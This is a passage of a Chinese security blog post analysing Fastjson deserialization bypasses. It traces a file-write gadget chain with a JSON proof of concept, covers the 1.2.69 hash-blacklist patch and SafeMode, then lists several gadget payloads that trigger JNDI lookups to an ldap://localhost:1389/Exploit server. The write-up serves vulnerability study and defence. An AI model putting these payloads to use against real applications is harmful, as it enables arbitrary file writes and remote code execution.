<p>可以看到成功读取文件内容并写入flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png"></p>
<h4 id="CdujD">写入文件</h4>
利用类：com.esotericsoftware.kryo.io.Output

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>该类写入了提供了<code>setOutputStream</code>和<code>setBuffer</code>两个setter方法用来写入输入流，其中的buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其<code>flush()</code>方法，该方法将流写入一个文件内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>写入文件时，我们就可以考虑写入恶意文件</p>
<p>接下来我们就看，怎么样去触发这个<code>flush</code>函数了，通过查找用法查看，只有在<code>close()</code>和<code>require()</code>函数被调用时才会触发，其中<code>require</code>只有在调用write相关函数时才会被触发，存在着链子的思维</p>
<p>我们找到<code>ObjectOutputStream</code>类，其中它的内部类<code>BlockDataOutputStream</code>的构造函数，将<code>OutputStream</code>类型参数赋值给了out成员变量，而其中的<code>setBolockDataMode</code>函数调用了<code>drain</code>方法，<code>drain</code>中又调用了<code>out.write</code>方法，从而调用了<code>flush</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>setBlockDataMode</code>函数的调用，在<code>ObjectOutputStream</code>类的有参构造函数中就存在：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">     verifySubclass();  </span><br><span class="line">     bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line">     handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">     enableOverride = <span class="literal">false</span>;  </span><br><span class="line">     writeStreamHeader();  </span><br><span class="line">     bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line">     <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line">         debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">     debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是Fastjson优先获取ObjectOutputStream类的无参构造方法，只能找它的继承类来触发了</p>
<p>我们找到一个只有有参构造方法的类：<code>com.sleepycat.bind.serial.SerialOutput</code></p>
<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，它的有参构造方法，是使用了他父类<code>ObjectOutputStream</code>的有参构造方法，这就满足我们之前的要求了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下，用到了Fastjson循环引用的技巧来调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/test.txt&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,</span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;cHduZWQ=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ZV6G8">补丁修复</h3>
在GitHub官方的diff，主要在ParserConfig.java中：

<p><a href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
<p>在expectClass的对比逻辑中，对类名进行了hash处理在比较hash黑名单，并添加了几个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png"></p>
<p>有人通过彩虹表碰撞，知道了其中新添加的三个类为如下</p>
<table>
<thead>
<tr>
<th><strong><font style="color:rgb(80, 80, 92);">版本</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">十六进制Hash值</font></strong></th>
<th><strong><font style="color:rgb(80, 80, 92);">类名</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">5183404141909004468L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x47ef269aadc650b4L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Runnable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">2980334044947851925L</font></td>
<td><font style="color:rgb(80, 80, 92);">0x295c4605fd1eaa95L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.Readable</font></td>
</tr>
<tr>
<td><font style="color:rgb(80, 80, 92);">1.2.69</font></td>
<td><font style="color:rgb(80, 80, 92);">-1368967840069965882L</font></td>
<td><font style="color:rgb(80, 80, 92);">0xed007300a7b227c6L</font></td>
<td><font style="color:rgb(80, 80, 92);">java.lang.AutoCloseable</font></td>
</tr>
</tbody></table>
<h3 id="paOC8">SafeMode</h3>
官方的参考：[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)

<p>在1.2.68之后的版本中，fastjson添加了safeMode的支持</p>
<p>该参数开启后，完全禁用autoType。所有安全修复版本sec10也支持safeMode配置</p>
<p>代码中开启SafeMode代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>开启之后，就完全禁用<code>AutoType</code>即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。具体的处理逻辑，是放在<code>checkAutoType()</code>函数中的前面，获取是否设置了<code>SafeMode</code>，如果是则直接抛出异常终止运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png"></p>
<h2 id="i8Gz2">其他一些绕过黑名单的Gadget</h2>
<h3 id="Ez1g2">1.2.59</h3>
com.zaxxer.hikari.HikariConfig类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="g66pt">1.2.61</h3>
org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="S7C1P">1.2.62</h3>
<font style="color:rgb(80, 80, 92);">org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="string">&quot;parameters&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MbKCt">1.2.68</h3>
<font style="color:rgb(80, 80, 92);">org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;或&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">com.caucho.config.types.ResourceRef类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span>,<span class="string">&quot;lookupName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;value&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.value&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="未知版本">未知版本</h3>
org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
</search>
